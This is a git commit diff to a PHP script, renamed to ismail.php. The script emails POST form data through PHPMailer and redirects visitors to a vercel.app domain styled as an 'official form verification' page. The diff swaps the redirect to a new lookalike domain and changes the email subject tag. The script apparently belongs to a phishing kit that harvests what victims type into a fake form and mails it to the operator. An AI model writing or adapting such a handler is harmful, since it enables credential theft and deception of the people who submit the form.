09ee797d145ebaaa2ec7bacb2eb881ef026c0b2a
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-18 16:44:52 +0800

    Update and rename md.php to ismail.php

--- ismail.php
+++ ismail.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://request-official-form-verification.vercel.app/");
+header("Location: https://request-team-form-verification-here.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MD';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
